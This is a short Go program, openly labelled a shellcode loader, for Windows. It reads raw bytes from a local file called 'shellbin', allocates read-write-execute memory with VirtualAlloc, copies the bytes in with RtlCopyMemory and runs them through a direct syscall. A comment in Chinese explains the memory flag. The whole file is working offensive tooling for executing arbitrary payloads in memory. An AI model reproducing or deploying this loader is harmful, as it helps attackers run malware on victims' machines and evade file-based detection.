package main

import (
	"io/ioutil"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40 // 區域可以執行程式碼，應用程式可以讀寫該區域。
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")
	ntdll         = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")
)

var shellcode [] byte

func main (){
	println("shellcode loader begin!")
	localpath , _ := os.Getwd()
	shellcodeFile( localpath +"\\shellbin")
	entry()
}

func shellcodeFile( pathToFile string ) int{
	content,err := ioutil.ReadFile( pathToFile )
	if err != nil{
		println( err.Error() )
		syscall.Exit(-1)
	}
	shellcode = content
	print(content)
	return 0
}

func entry() int{
	/* shellcode area*/
	print("alloc memory")
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		println( err.Error() )
		syscall.Exit(1)
	}else {
		println( "alloc success")
		println( err.Error() )
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	if err != nil && err.Error() != "The operation completed successfully." {
		println( err.Error() )
		syscall.Exit(2)
	}else {
		println("copy success")
		println( err.Error() )
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
	return 0
}